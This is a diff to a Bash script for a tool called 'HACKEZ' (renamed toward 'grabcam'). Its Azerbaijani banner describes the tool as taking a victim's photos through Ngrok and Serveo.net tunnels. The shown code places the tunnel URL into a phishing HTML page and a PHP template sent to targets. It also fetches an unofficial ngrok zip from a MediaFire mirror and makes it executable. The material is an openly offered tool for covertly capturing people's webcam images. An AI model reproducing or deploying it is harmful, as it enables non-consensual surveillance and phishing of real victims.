@@ -18,7 +18,11 @@ echo '
 │HACKEZ Tool-a xos gelmisiniz :)                                                                                                               │
 │Ngrok ve Serveo.net(local host) istifade ederek victim-in fotolarinin alinmasi aleti                                                                                                           │Termux ve Arch Linuxta test edilmisdir
 │Made in Azerbaijan Broooo                                                                                                                                                                     │
- '
+│                                                                                                                                                                     │
+│                                                                                                                                                                     │
+│                                                                                                                                                                     │
+│                                                                                                                                                 HEXATRONN :)     │
+└─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘ ' |lolcat
 
                                                                                
 echo " "
@@ -131,7 +135,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' hackez.html > index2.html
+sed 's+forwarding_link+'$link'+g' grabcam.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -149,7 +153,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok yuklenilir...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://www.mediafire.com/file/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1
+wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1
 
 if [[ -e ngrok+wifi+data.zip ]]; then
 unzip ngrok+wifi+data.zip > /dev/null 2>&1
@@ -161,7 +165,7 @@ exit 1
 fi
 
 else
-wget https://www.mediafire.com/file/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1 
+wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok+wifi+data.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -219,7 +223,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' hackez.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' grabcam.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
@@ -228,7 +232,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="hackez$RANDOM"
+default_subdomain="grabcam$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Eminsiniz? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
